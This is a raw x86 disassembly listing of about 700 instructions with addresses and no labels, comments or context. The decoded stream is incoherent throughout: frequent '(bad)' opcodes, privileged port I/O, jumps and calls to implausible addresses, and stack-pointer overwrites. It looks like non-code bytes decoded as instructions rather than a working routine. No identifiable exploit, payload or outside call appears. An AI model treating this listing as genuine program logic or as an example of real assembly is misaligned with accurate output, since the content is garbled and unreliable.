  42a177:	lea    ebx,[ecx+0x4f]
  42a17a:	push   0xb1000003
  42a17f:	out    dx,eax
  42a180:	add    ebp,DWORD PTR [edx+edx*2]
  42a183:	add    BYTE PTR [ebx+ecx*4],bh
  42a186:	mov    ch,BYTE PTR [ebx]
  42a188:	jb     0x42a1fc
  42a18a:	add    al,0x89
  42a18c:	push   eax
  42a18d:	call   0x842aeeff
  42a192:	add    DWORD PTR [eax+eax*1],eax
  42a195:	jae    0x42a1ab
  42a197:	icebp  
  42a198:	inc    ebp
  42a199:	mov    eax,DWORD PTR gs:[ecx]
  42a19c:	int3   
  42a19d:	out    dx,al
  42a19e:	loopne 0x42a1ed
  42a1a0:	sub    eax,DWORD PTR [edx]
  42a1a2:	push   0xffffff83
  42a1a4:	pop    esi
  42a1a5:	push   cs
  42a1a6:	jl     0x42a1c1
  42a1a8:	add    al,0xaf
  42a1aa:	xor    eax,0x832b6d00
  42a1af:	mov    eax,DWORD PTR [edx]
  42a1b1:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42a1b7:	ror    DWORD PTR [ebx+0x7dc8e803],1
  42a1bd:	inc    ebp
  42a1be:	shr    ebx,0x3
  42a1c1:	or     DWORD PTR [eax],0x4
  42a1c4:	push   0xffffffa5
  42a1c6:	pop    esi
  42a1c7:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  42a1ce:	jmp    0x42a22d
  42a1d0:	mov    edi,0xff0272
  42a1d5:	fdivr  QWORD PTR [ebp+0x5d]
  42a1d8:	push   0x4e
  42a1da:	pop    ecx
  42a1db:	call   0x42e5e0
  42a1e0:	mov    DWORD PTR [ebx],eax
  42a1e2:	in     al,0xc8
  42a1e4:	rol    BYTE PTR [ebp-0x75],0xc1
  42a1e8:	call   0xaca3c9
  42a1ed:	pop    esi
  42a1ee:	enter  0xceff,0x8b
  42a1f2:	repz mov ecx,DWORD PTR [ebp-0x34]
  42a1f6:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  42a1fd:	je     0x42a1ff
  42a1ff:	or     DWORD PTR [ebx-0x74183b24],eax
  42a205:	jne    0x42a1eb
  42a207:	jmp    0x42a202
  42a209:	push   DWORD PTR [edx-0x24]
  42a20c:	push   0x4d
  42a20e:	pop    ecx
  42a20f:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42a213:	jge    0x42a21b
  42a215:	mov    eax,eax
  42a217:	sub    ebp,DWORD PTR [edx+0x24]
  42a21a:	pop    esi
  42a21b:	inc    ebp
  42a21c:	mov    esp,0x8b6077
  42a221:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  42a227:	lods   al,BYTE PTR ds:[esi]
  42a228:	add    BYTE PTR [ebx],bh
  42a22a:	enter  0xce73,0x49
  42a22e:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  42a236:	stc    
  42a237:	jge    0x42a2ab
  42a239:	jnp    0xdd42259a
  42a23f:	call   0xc5a315
  42a244:	fadd   st(0),st
  42a246:	dec    esi
  42a247:	ins    BYTE PTR es:[edi],dx
  42a248:	stc    
  42a249:	cmp    al,0x73
  42a24b:	push   ebp
  42a24c:	mov    eax,0xf8028b
  42a251:	jne    0x42a214
  42a253:	mov    esi,ecx
  42a255:	mov    esp,DWORD PTR [ebp+0x2c]
  42a258:	add    edi,DWORD PTR [ebp-0x24]
  42a25b:	sub    esp,eax
  42a25d:	and    al,0x45
  42a25f:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  42a265:	sbb    al,0xee
  42a267:	pop    esi
  42a268:	call   0x82a298
  42a26d:	fsubr  st,st(3)
  42a26f:	sti    
  42a270:	add    BYTE PTR gs:[ecx],bh
  42a273:	add    eax,esp
  42a275:	add    DWORD PTR [esi],eax
  42a277:	rol    DWORD PTR [ebp+0x8],0x29
  42a27b:	mov    esp,eax
  42a27d:	clc    
  42a27e:	jne    0x42a2f5
  42a280:	mov    eax,0x8b0673
  42a285:	loopne 0x42a2cc
  42a287:	loopne 0x42a212
  42a289:	lods   al,BYTE PTR ds:[esi]
  42a28a:	int3   
  42a28b:	inc    ebp
  42a28c:	mov    DWORD PTR gs:[eax+edi*8],eax
  42a290:	add    al,0xc3
  42a292:	sub    ecx,DWORD PTR [ebp+0x47]
  42a295:	(bad)  
  42a297:	shr    BYTE PTR [ebp-0x1f],0xe8
  42a29b:	add    eax,DWORD PTR [eax]
  42a29d:	call   0x64463a2
  42a2a2:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42a2a8:	dec    esi
  42a2a9:	ins    DWORD PTR es:[edi],dx
  42a2aa:	in     al,dx
  42a2ab:	lea    eax,[eax]
  42a2ad:	inc    ebp
  42a2ae:	inc    ebp
  42a2af:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42a2b5:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  42a2bf:	and    al,0xdc
  42a2c1:	ror    DWORD PTR [edx+0x24],0xf7
  42a2c5:	or     BYTE PTR [ebp+0x4c],dh
  42a2c8:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  42a2cc:	stos   BYTE PTR es:[edi],al
  42a2cd:	adc    edx,edi
  42a2cf:	inc    esp
  42a2d0:	add    edi,DWORD PTR [eax]
  42a2d2:	jne    0x42a2b7
  42a2d4:	mov    DWORD PTR [eax-0x7449db04],ecx
  42a2da:	cmp    ecx,DWORD PTR [edi]
  42a2dc:	sub    BYTE PTR [ebp-0x7e],dl
  42a2df:	sar    ebp,0xb
  42a2e2:	jmp    FWORD PTR [edi+0x2400392a]
  42a2e8:	sub    esi,DWORD PTR [ebx-0x73]
  42a2eb:	mov    esp,DWORD PTR [ecx+edi*4]
  42a2ee:	mov    ecx,DWORD PTR [eax]
  42a2f0:	and    BYTE PTR [eax],al
  42a2f2:	jne    0x42a2be
  42a2f4:	sub    ebp,ecx
  42a2f6:	sbb    BYTE PTR [esi+0x32],ah
  42a2f9:	dec    ebp
  42a2fa:	push   ebp
  42a2fb:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  42a301:	ret    
  42a302:	mov    edx,ebp
  42a304:	leave  
  42a305:	sub    DWORD PTR [esi+0x24],ebx
  42a308:	ret    0x2b
  42a30b:	pop    ax
  42a30d:	push   ebp
  42a30e:	rol    BYTE PTR [ebx],0xeb
  42a311:	add    DWORD PTR [ecx+0x6c0001],0x40
  42a318:	jb     0x42a36f
  42a31a:	ret    
  42a31b:	in     al,dx
  42a31c:	jecxz  0x42a2a9
  42a31e:	push   esi
  42a31f:	xchg   esp,eax
  42a320:	jne    0x42a322
  42a322:	cmp    edx,DWORD PTR [esi+0x1c]
  42a325:	jne    0x42a30b
  42a327:	mov    eax,DWORD PTR [ebp-0x77]
  42a32a:	ror    DWORD PTR [ebx+0x899408],0xe0
  42a331:	mov    esi,DWORD PTR [ebp-0x75]
  42a334:	pop    esi
  42a335:	nop
  42a336:	mov    eax,DWORD PTR [eax]
  42a338:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  42a33e:	add    al,0x0
  42a340:	inc    ebp
  42a341:	mov    eax,DWORD PTR [ebx]
  42a343:	mov    ebp,ebx
  42a345:	cmp    al,0xf
  42a347:	or     al,al
  42a349:	inc    ebp
  42a34a:	inc    ebp
  42a34b:	xor    eax,0x8bc89c8b
  42a350:	ins    BYTE PTR es:[edi],dx
  42a351:	cld    
  42a352:	add    BYTE PTR [edi+0x576c16c0],dh
  42a358:	add    BYTE PTR [ecx-0x5],dl
  42a35b:	add    eax,0x17200
  42a360:	sbb    al,0x85
  42a362:	dec    esp
  42a363:	je     0x42a39d
  42a365:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  42a369:	add    BYTE PTR [ebx],bh
  42a36b:	(bad)  
  42a36c:	and    al,0x34
  42a36e:	jae    0x42a30c
  42a370:	mov    cl,cl
  42a372:	inc    DWORD PTR [esp]
  42a375:	push   ebp
  42a376:	shr    esp,0x8
  42a379:	in     al,dx
  42a37a:	push   esp
  42a37b:	add    DWORD PTR [eax],esp
  42a37d:	add    bl,cl
  42a37f:	inc    ebp
  42a380:	mov    bh,0x53
  42a382:	add    BYTE PTR [ebp-0x17],al
  42a385:	push   esi
  42a386:	cmovne ecx,edx
  42a389:	xor    al,0x4c
  42a38b:	pushf  
  42a38c:	and    BYTE PTR [edi+0x17],dl
  42a38f:	xor    eax,0x89009cd9
  42a394:	add    ah,bh
  42a396:	sub    eax,DWORD PTR [ebp-0x3f]
  42a399:	aad    0x5
  42a39b:	inc    ebp
  42a39c:	add    eax,edx
  42a39e:	add    BYTE PTR [ebp-0x40],al
  42a3a1:	xlat   BYTE PTR ds:[ebx]
  42a3a2:	ins    BYTE PTR es:[edi],dx
  42a3a3:	inc    ebp
  42a3a4:	inc    eax
  42a3a5:	and    ecx,eax
  42a3a7:	dec    ecx
  42a3a8:	add    eax,0x202e4c45
  42a3ad:	inc    ebp
  42a3ae:	fnstcw WORD PTR [ecx+ebp*1-0x37]
  42a3b2:	add    BYTE PTR [esi+0xc000c0],bh
  42a3b8:	lea    eax,[esp-0x34]
  42a3bc:	ret    
  42a3bd:	mov    dh,0x8b
  42a3bf:	xor    edx,DWORD PTR [ecx+0x3]
  42a3c2:	mov    al,BYTE PTR [ecx+0x1]
  42a3c5:	sbb    BYTE PTR [eax],al
  42a3c7:	stc    
  42a3c8:	mov    esi,DWORD PTR [edx+0x8]
  42a3cb:	(bad)  
  42a3cc:	les    esi,FWORD PTR ss:[ecx]
  42a3cf:	(bad)  
  42a3d0:	mov    al,ch
  42a3d2:	add    esi,eax
  42a3d4:	add    dh,al
  42a3d6:	or     esi,eax
  42a3d8:	mov    dl,0xc7
  42a3da:	add    esi,eax
  42a3dc:	add    al,cl
  42a3de:	push   cs
  42a3df:	mov    BYTE PTR [edx+0xc601c9],0xca
  42a3e6:	or     BYTE PTR [ebx],dh
  42a3e8:	dec    ecx
  42a3e9:	lea    eax,[ebx]
  42a3eb:	or     eax,0x18fc0fc7
  42a3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a3f1:	(bad)  
  42a3f3:	fiadd  WORD PTR [ebp-0x78]
  42a3f6:	jae    0xed77ab45
  42a3fc:	or     BYTE PTR [ebp+0x7],al
  42a3ff:	loope  0x42a39f
  42a401:	inc    ebp
  42a402:	xor    dl,ah
  42a404:	pop    esi
  42a405:	inc    ebp
  42a406:	shr    eax,0xc
  42a409:	inc    ebp
  42a40a:	and    ch,0x1
  42a40d:	inc    ebp
  42a40e:	add    bh,bl
  42a410:	add    BYTE PTR [ebp-0x7b],al
  42a413:	in     al,dx
  42a414:	clc    
  42a415:	inc    ebp
  42a416:	ret    0xd7
  42a419:	inc    ebp
  42a41a:	mov    edi,DWORD PTR [ecx+eax*4-0x37]
  42a41e:	sub    al,0x44
  42a420:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  42a427:	add    ebx,DWORD PTR [ecx+eax*2]
  42a42a:	(bad)  
  42a42b:	sbb    al,ah
  42a42d:	stc    
  42a42e:	test   DWORD PTR [edx-0x8],esi
  42a431:	lea    edi,[edi-0x7007aa4]
  42a437:	mov    DWORD PTR [ebp-0x24],edi
  42a43a:	(bad)  
  42a43b:	dec    ebp
  42a43c:	int3   
  42a43d:	mov    eax,0x71cdfcc6
  42a442:	mov    BYTE PTR [ecx],0xce
  42a445:	(bad)  
  42a446:	(bad)  
  42a447:	dec    edi
  42a449:	jmp    FWORD PTR [edx-0x38]
  42a44c:	(bad)  
  42a44d:	or     dl,al
  42a44f:	jge    0x42a417
  42a451:	(bad)  
  42a452:	shl    esp,1
  42a454:	xor    eax,DWORD PTR [ebp+0x45cbf85a]
  42a45a:	add    BYTE PTR [ebx+0xd8c8d],cl
  42a460:	rdpmc  
  42a462:	sbb    BYTE PTR [edi+0x7de08da],bh
  42a468:	mov    BYTE PTR [esi+0x39063283],bl
  42a46e:	in     eax,dx
  42a46f:	cmovne ebx,DWORD PTR [edx]
  42a472:	jecxz  0x42a474
  42a474:	inc    ebp
  42a475:	mov    esp,ecx
  42a477:	sbb    al,0x45
  42a479:	mov    ebx,edx
  42a47b:	add    DWORD PTR [ebp+0x0],eax
  42a47e:	out    dx,al
  42a47f:	add    DWORD PTR [ebp+0x4d],eax
  42a482:	and    DWORD PTR [ebx+0x2e8045],ecx
  42a488:	inc    ebp
  42a489:	mov    DWORD PTR [edx+ebp*2-0x37],edi
  42a48d:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d4
  42a495:	inc    ebp
  42a496:	add    ebx,edi
  42a498:	inc    ecx
  42a499:	xlat   BYTE PTR ds:[ebx]
  42a49a:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  42a4a0:	(bad)  
  42a4a1:	xor    bh,BYTE PTR [eax+eax*4+0x8bd35c6]
  42a4a8:	(bad)  
  42a4a9:	dec    esi
  42a4aa:	mov    esi,0xbf45c6f3
  42a4af:	mov    esi,eax
  42a4b1:	fadd   st,st(0)
  42a4b3:	inc    esi
  42a4b5:	(bad)  
  42a4b6:	rcl    esp,0xc6
  42a4b9:	inc    edx
  42a4bb:	push   eax
  42a4bc:	mov    BYTE PTR [ebp-0x3d],0x33
  42a4c0:	xor    eax,DWORD PTR [ebx]
  42a4c2:	lea    edx,[eax+0xd]
  42a4c5:	inc    ebp
  42a4c6:	jae    0x8c1d0ae4
  42a4cc:	ficomp WORD PTR [eax+ecx*4]
  42a4cf:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  42a4d6:	test   esi,edi
  42a4d8:	(bad)  
  42a4d9:	(bad)  
  42a4da:	inc    DWORD PTR [eax]
  42a4dc:	inc    ebp
  42a4dd:	add    BYTE PTR [ebx-0x10aa23d0],cl
  42a4e3:	mov    edx,DWORD PTR [ebx]
  42a4e5:	cld    
  42a4e6:	mov    edi,ecx
  42a4e8:	mov    ecx,ebx
  42a4ea:	pop    esp
  42a4eb:	sar    edi,0x1e
  42a4ee:	cmp    ebp,esi
  42a4f0:	jne    0x42a565
  42a4f2:	mov    DWORD PTR ds:0x22450be4,ecx
  42a4f8:	loop   0x42a4e8
  42a4fa:	pushf  
  42a4fb:	jae    0x42a488
  42a4fd:	add    eax,0x3388e91c
  42a502:	add    esi,ebp
  42a504:	add    BYTE PTR [ebx-0x40],dh
  42a507:	jmp    0x93a563
  42a50c:	mov    ebx,0x6a7275
  42a511:	pop    ecx
  42a512:	add    DWORD PTR [ebp+eax*4-0x77],esi
  42a516:	add    bh,BYTE PTR [eax+0x0]
  42a519:	dec    DWORD PTR [ebp+0x66]
  42a51c:	mov    ecx,DWORD PTR [ebp-0xff0084]
  42a522:	mov    DWORD PTR [edx-0x75],ebp
  42a525:	data16 sbb al,0x8d
  42a528:	mov    edi,edi
  42a52a:	add    edi,edi
  42a52c:	add    BYTE PTR [edx+0x1],ch
  42a52f:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  42a536:	call   0xd8906ca1
  42a53b:	push   0xffffffec
  42a53d:	pop    ecx
  42a53e:	jl     0x42a4c9
  42a540:	inc    ebp
  42a541:	sbb    BYTE PTR [esi-0x37],0x8
  42a545:	test   edx,ecx
  42a547:	(bad)  
  42a548:	jmp    0x41032e4c
  42a54d:	push   ebp
  42a54e:	jne    0x42a5b6
  42a550:	lea    ecx,[ebp-0x2c]
  42a553:	mov    DWORD PTR [ebp-0x200158],0xfe4585d4
  42a55d:	into   
  42a55e:	(bad)  
  42a55f:	jmp    0x42a4ec
  42a561:	(bad)  
  42a562:	loopne 0x42a514
  42a564:	(bad)  
  42a565:	rol    ebx,cl
  42a567:	call   0xdf5eeaf7
  42a56c:	shr    cl,0x50
  42a56f:	inc    bp
  42a571:	inc    ebp
  42a572:	mov    eax,ebp
  42a574:	cwde   
  42a575:	mov    DWORD PTR [eax],0xd4ffc7d4
  42a57b:	add    bh,bh
  42a57d:	add    BYTE PTR [ecx],al
  42a57f:	call   0x141bd84
  42a584:	inc    DWORD PTR [ebp-0xb201f8]
  42a58a:	xor    eax,DWORD PTR [ebp-0xc401fd]
  42a590:	jne    0x42a51d
  42a592:	mov    eax,ds:0x33c70be0
  42a597:	ret    
  42a598:	out    dx,eax
  42a599:	mov    edx,DWORD PTR ds:0xbc0a31c
  42a59f:	push   eax
  42a5a0:	xor    eax,DWORD PTR [ebp-0x71]
  42a5a3:	mov    esi,DWORD PTR [edx-0x68]
  42a5a6:	mov    ds:0x33ff0b00,eax
  42a5ab:	(bad)  
  42a5ac:	mov    ecx,0x8b8d0008
  42a5b1:	call   FWORD PTR [edi+edi*8]
  42a5b4:	and    bh,bh
  42a5b6:	push   0x66
  42a5b8:	mov    bp,0xff8d
  42a5bc:	(bad)  
  42a5bd:	(bad)  
  42a5be:	dec    DWORD PTR [edi]
  42a5c0:	mov    DWORD PTR [edx],eax
  42a5c2:	jp     0x42a5c4
  42a5c4:	(bad)  
  42a5c5:	mov    ecx,0x774f59
  42a5ca:	mov    ecx,eax
  42a5cc:	jl     0x42a557
  42a5ce:	dec    DWORD PTR [eax-0x74c73fa7]
  42a5d4:	mov    DWORD PTR [esi+0x7e],esp
  42a5d7:	push   ebp
  42a5d8:	dec    DWORD PTR [ebp-0x7676f2a7]
  42a5de:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  42a5e6:	xor    ecx,DWORD PTR [ebp-0x7627ec77]
  42a5ec:	call   DWORD PTR [eax+0x668dc233]
  42a5f2:	test   al,0x55
  42a5f4:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  42a5fa:	int3   
  42a5fb:	xchg   esp,eax
  42a5fc:	loopne 0x42a587
  42a5fe:	(bad)  
  42a5ff:	xchg   esi,eax
  42a600:	lods   al,BYTE PTR ds:[esi]
  42a601:	ret    0x8bd3
  42a604:	in     eax,dx
  42a605:	inc    bp
  42a607:	dec    ebp
  42a608:	loop   0x42a5c3
  42a60a:	ds dec edi
  42a60c:	mov    DWORD PTR [eax],0x89eaf1b4
  42a612:	loope  0x42a678
  42a614:	(bad)  
  42a615:	(bad)  
  42a616:	mov    eax,0x85667c8b
  42a61b:	mov    ch,0xfe
  42a61d:	(bad)  
  42a61e:	(bad)  
  42a61f:	inc    DWORD PTR [eax]
  42a621:	jno    0x42a623
  42a623:	data16 mov bl,0xb5
  42a626:	add    bh,bh
  42a628:	mov    edi,edi
  42a62a:	fmul   QWORD PTR [ecx-0x729501]
  42a630:	aam    0x8d
  42a632:	call   ebx
  42a634:	push   eax
  42a635:	mov    DWORD PTR [ebp+0x6c],eax
  42a638:	xor    edi,edi
  42a63a:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  42a640:	sub    DWORD PTR [esi+0x44],0xffffffff
  42a644:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  42a64a:	add    DWORD PTR [eax+0x0],esi
  42a64d:	push   DWORD PTR [eax]
  42a64f:	push   bp
  42a651:	lea    ecx,[ebp-0x8701]
  42a657:	mov    DWORD PTR [ecx+0x74],edx
  42a65a:	sar    bh,1
  42a65c:	or     DWORD PTR [ebx-0x48000386],0x77
  42a663:	fs test edi,edi
  42a666:	add    al,0x33
  42a668:	add    BYTE PTR [ebx],al
  42a66a:	adc    dh,BYTE PTR [ebx]
  42a66c:	add    BYTE PTR [esi-0x75],ah
  42a66f:	test   DWORD PTR [esi-0x1],esp
  42a672:	inc    ebp
  42a673:	inc    DWORD PTR [ebx-0x2ff00abb]
  42a679:	dec    ebp
  42a67a:	mov    DWORD PTR [ebx],esi
  42a67c:	mov    al,BYTE PTR [ebx]
  42a67e:	push   ecx
  42a67f:	xor    esp,DWORD PTR [esi+0x66]
  42a682:	push   ebp
  42a683:	inc    ebp
  42a684:	xor    DWORD PTR [ebx],0x8
  42a687:	mov    WORD PTR [ebp-0x72],ax
  42a68b:	push   cx
  42a68d:	inc    ebp
  42a68e:	adc    WORD PTR [ebp-0x64],0xff83
  42a693:	mov    DWORD PTR [ebx],0x92b589f8
  42a699:	clc    
  42a69a:	push   ecx
  42a69b:	inc    ebp
  42a69c:	data16 cmc 
  42a69e:	push   ebp
  42a69f:	pushf  
  42a6a0:	data16 (bad) 
  42a6a2:	dec    ebp
  42a6a3:	in     al,0x83
  42a6a5:	test   DWORD PTR [edi-0x76ba3508],eax
  42a6ab:	xor    ebx,DWORD PTR [eax+0xc7329c]
  42a6b1:	in     al,0x8b
  42a6b3:	add    eax,0x45b5f866
  42a6b8:	dec    DWORD PTR [ebx+0xf094ff]
  42a6be:	mov    DWORD PTR [ecx+0x45fff466],ecx
  42a6c4:	lea    ecx,[ebx-0x4e76e3b3]
  42a6ca:	push   0x6600ff01
  42a6cf:	push   cs
  42a6d0:	test   DWORD PTR [eax+0xff01ff],eax
  42a6d6:	inc    ecx
  42a6d7:	inc    ebp
  42a6d8:	mov    WORD PTR [ebp-0x360018],ax
  42a6df:	push   cs
  42a6e0:	shl    BYTE PTR [ebp+0x66],0x8b
  42a6e4:	test   DWORD PTR [edi+edi*8],ebx
  42a6e7:	cs (bad) 
  42a6e9:	inc    DWORD PTR [ecx-0x75]
  42a6ec:	data16 in al,dx
  42a6ee:	test   DWORD PTR [eax],ecx
  42a6f0:	inc    DWORD PTR [eax]
  42a6f2:	inc    DWORD PTR [ecx-0x77]
  42a6f5:	mov    esi,DWORD PTR [edx-0x77]
  42a6f8:	call   FWORD PTR [eax]
  42a6fa:	leavew 
  42a6fc:	xchg   ebp,eax
  42a6fd:	inc    edi
  42a6fe:	push   DWORD PTR [ebp-0x1]
  42a701:	call   0xff52924b
  42a706:	lea    eax,[ebp-0x1]
  42a709:	mov    edi,edi
  42a70b:	enter  0xc7,0xc3
  42a70f:	mov    eax,ecx
  42a711:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  42a717:	sbb    al,0x8b
  42a719:	sbb    esp,edi
  42a71b:	dec    ebp
  42a71c:	mov    bh,0x8b
  42a71e:	mov    ah,cl
  42a720:	mov    DWORD PTR [eax],0x8bc1ffc3
  42a726:	mov    eax,ebx
  42a728:	mov    BYTE PTR [eax],al
  42a72a:	sar    bh,0x89
  42a72d:	sub    BYTE PTR [eax-0x77ff766c],cl
  42a733:	mov    esp,DWORD PTR [ebp+0x7c]
  42a736:	add    BYTE PTR [eax],al
  42a738:	inc    ebp
  42a739:	mov    esi,DWORD PTR ds:0xc7049c8d
  42a73f:	or     ah,bl
  42a741:	add    BYTE PTR [ebp+0x458bf800],0x85
  42a748:	xor    DWORD PTR [edi],ecx
  42a74a:	pushf  
  42a74b:	js     0x42a714
  42a74d:	add    al,dh
  42a74f:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  42a755:	inc    eax
  42a756:	xor    eax,0x8b209f89
  42a75b:	call   FWORD PTR [ebx+ecx*4]
  42a75e:	cmp    al,0x1
  42a761:	mov    DWORD PTR [eax],0x8b8545c3
  42a767:	call   FWORD PTR [edi+edi*8]
  42a76a:	dec    ebp
  42a76b:	inc    ebp
  42a76c:	mov    eax,DWORD PTR [ebx-0xffe374]
  42a772:	mov    eax,DWORD PTR [eax]
  42a774:	mov    eax,edi
  42a776:	nop
  42a777:	ret    
  42a778:	add    BYTE PTR [ebp-0x130077],al
  42a77e:	jne    0x42a705
  42a780:	test   edi,edi
  42a782:	jne    0x42a783
  42a784:	dec    DWORD PTR [ebx-0x38aa1fe8]
  42a78a:	call   0xffcea452
  42a78f:	sbb    al,0x45
  42a791:	stos   BYTE PTR es:[edi],al
  42a792:	mov    eax,DWORD PTR [eax]
  42a794:	mov    edx,DWORD PTR [eax+0x3]
  42a797:	inc    ebp
  42a798:	cmp    al,0x8b
  42a79a:	push   cs
  42a79b:	cwde   
  42a79c:	inc    ebp
  42a79d:	add    BYTE PTR [ebp-0xe78b39],al
  42a7a3:	call   FWORD PTR [esp+eax*1]
  42a7a6:	test   eax,0x8bffff00
  42a7ab:	mov    DWORD PTR [esp+eiz*4],ebx
  42a7ae:	adc    BYTE PTR [ebp+0x1],0x8b
  42a7b2:	add    al,ch
  42a7b4:	add    al,dh
  42a7b6:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  42a7bd:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  42a7c3:	inc    ebp
  42a7c4:	add    DWORD PTR [ebx-0x7aceb000],ecx
  42a7ca:	cmp    bh,0x1
  42a7cd:	inc    DWORD PTR [eax]
  42a7cf:	inc    ebp
  42a7d0:	push   eax
  42a7d1:	xor    ebp,ecx
  42a7d3:	add    eax,DWORD PTR [edx]
  42a7d5:	mov    DWORD PTR [eax],eax
  42a7d7:	and    al,0x80
  42a7d9:	inc    DWORD PTR [ecx]
  42a7db:	lea    eax,[eax]
  42a7dd:	pushf  
  42a7de:	or     BYTE PTR [ebp-0xfe00bb],al
  42a7e4:	jmp    0x141aa6e
  42a7e9:	dec    DWORD PTR [esi]
  42a7eb:	mov    ecx,ecx
  42a7ed:	loopne 0x42a774
  42a7ef:	mov    DWORD PTR [edx],0x4d8b00c3
  42a7f5:	sbb    al,0x8b
  42a7f7:	out    dx,al
  42a7f8:	mov    eax,DWORD PTR [eax]
  42a7fa:	push   eax
  42a7fb:	push   eax
  42a7fc:	test   DWORD PTR [ebp-0x1],eax
  42a7ff:	mov    edi,edi
  42a801:	cwde   
  42a802:	inc    ebp
  42a803:	add    BYTE PTR [ebx],dh
  42a805:	mov    DWORD PTR [ebx],0x24ff8918
  42a80b:	add    al,0xff
  42a80d:	add    BYTE PTR [ebx-0x5ae30f77],cl
  42a813:	(bad)  
  42a814:	(bad)  
  42a815:	(bad)  
  42a816:	(bad)  
  42a817:	push   DWORD PTR [ebx]
  42a819:	or     BYTE PTR [ebx],al
  42a81b:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  42a822:	(bad)  
  42a823:	cld    
  42a824:	sbb    BYTE PTR [ebx+0x765050ff],al
  42a82a:	inc    ebp
  42a82b:	mov    esi,DWORD PTR [ebx]
  42a82d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a82e:	add    ecx,esi
  42a830:	push   eax
  42a831:	mov    BYTE PTR [ebp+0x4d],0x5
  42a835:	jmp    0x42a837
  42a837:	mov    eax,DWORD PTR [eax]
  42a839:	clc    
  42a83a:	mov    ecx,DWORD PTR [esp+ebx*1]
  42a83d:	inc    DWORD PTR [eax+0x5501fc]
  42a843:	mov    BYTE PTR [ebp-0xe70075],al
  42a849:	cmp    eax,DWORD PTR [eax]
  42a84b:	push   eax
  42a84c:	add    cl,ch
  42a84e:	xor    BYTE PTR [esi+0x4d],cl
  42a851:	add    edi,edi
  42a853:	mov    ecx,DWORD PTR [eax]
  42a855:	mov    al,ds:0x8b8b004d
  42a85a:	mov    ebp,DWORD PTR [ebx]
  42a85c:	hlt    
  42a85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a85e:	add    dh,al
  42a860:	add    DWORD PTR [ebp+0x45],edx
  42a863:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  42a869:	dec    ebp
  42a86a:	inc    eax
  42a86b:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  42a871:	add    BYTE PTR [ebx-0x38162400],cl
  42a877:	add    bl,al
  42a879:	add    BYTE PTR [ebp-0x2e003e],al
  42a87f:	mov    DWORD PTR [ebp-0x10],eax
  42a882:	mov    DWORD PTR [ebp+0x28],esp
  42a885:	push   eax
  42a886:	dec    DWORD PTR [ecx+0x5518e88d]
  42a88c:	dec    DWORD PTR [ecx+0x5545f050]
  42a892:	xor    ecx,DWORD PTR [edi]
  42a894:	add    edx,DWORD PTR [edx]
  42a896:	push   eax
  42a897:	xchg   ebp,eax
  42a898:	inc    ebp
  42a899:	inc    DWORD PTR ds:0xe200ff
  42a89f:	jnp    0x8097c4a5
  42a8a5:	mov    eax,DWORD PTR [ecx]
  42a8a7:	pusha  
  42a8a8:	add    bh,bh
  42a8aa:	test   ecx,eax
  42a8ac:	dec    DWORD PTR [edi+edi*8]
  42a8af:	ret    0x8d00
  42a8b2:	add    bh,bh
  42a8b4:	mov    ch,0xd7
  42a8b6:	(bad)  
  42a8b7:	cli    
  42a8b8:	inc    DWORD PTR [ebp+0x2255f830]
  42a8be:	test   DWORD PTR [ebp+0x74],ecx
  42a8c1:	add    ecx,DWORD PTR [ebx+0x65a01889]
  42a8c7:	or     BYTE PTR [eax],al
  42a8c9:	cmp    DWORD PTR [eax+0x74],edi
  42a8cc:	add    BYTE PTR [ebx+0x114dfc23],cl
  42a8d2:	sub    eax,DWORD PTR [eax]
  42a8d4:	mov    ecx,DWORD PTR [ebp-0x77]
  42a8d7:	mov    eax,edi
  42a8d9:	add    DWORD PTR [ebx],eax
  42a8db:	inc    ebp
  42a8dc:	dec    ebp
  42a8dd:	mov    ecx,DWORD PTR [edx+0x45450118]
  42a8e3:	add    cl,BYTE PTR [ebx+0x875fc4d]
  42a8e9:	mov    ecx,DWORD PTR [ebp-0xc]
  42a8ec:	inc    eax
  42a8ed:	push   ebp
  42a8ee:	push   ecx
  42a8ef:	mov    esi,DWORD PTR [edx-0x14]
  42a8f2:	mov    edx,DWORD PTR [ecx+0xce003c]
  42a8f8:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  42a8ff:	add    al,0x55
  42a901:	push   ebp
  42a902:	add    ecx,DWORD PTR [ecx-0x2d030777]
  42a908:	push   ecx
  42a909:	test   DWORD PTR [ebx],eax
  42a90b:	dec    DWORD PTR [ecx+0x554518ff]
  42a911:	mov    edi,eax
  42a913:	sbb    al,0xec
  42a915:	inc    DWORD PTR [eax]
  42a917:	mov    DWORD PTR [eax],0xff8318
  42a91d:	add    al,0x83
  42a91f:	add    al,bh
  42a921:	mov    ebp,edx
  42a923:	push   eax
  42a924:	push   ebp
  42a925:	test   DWORD PTR [edi+edi*8-0x73],esi
  42a929:	dec    DWORD PTR [eax]
